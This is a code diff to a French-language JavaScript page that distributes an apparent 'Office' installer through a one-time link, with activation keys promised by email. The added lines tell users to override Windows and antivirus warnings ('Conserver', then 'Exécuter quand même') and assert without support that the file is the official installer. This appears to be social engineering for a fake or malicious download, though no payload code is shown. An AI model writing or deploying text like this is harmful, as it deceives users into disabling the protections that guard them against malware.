@@ -78,6 +78,7 @@ function showReady() {
     el("p", "Cliquez sur le bouton ci-dessous. Ce lien est personnel et ne fonctionne qu'une seule fois."),
     btn,
     el("p", "Après le téléchargement, lancez le fichier pour installer Office. Votre clé d'activation vous sera envoyée par email.", "note"),
+    el("p", "Le téléchargement ne démarre pas ou s'arrête ? Recliquez sur le bouton : c'est possible pendant 30 minutes. Si Windows ou l'antivirus affiche un avertissement, choisissez « Conserver » puis « Exécuter quand même » : le fichier est le programme d'installation officiel.", "note"),
   );
   btn.addEventListener("click", async () => {
     btn.disabled = true;
@@ -90,7 +91,8 @@ function showReady() {
       });
       const d = await r.json();
       if (d.ok && d.url) {
-        btn.textContent = "Téléchargement lancé ✔";
+        btn.textContent = "Téléchargement lancé ✔ (recliquer si besoin)";
+        btn.disabled = false;
         window.location.href = d.url;
       } else {
         showProblem(d.reason);
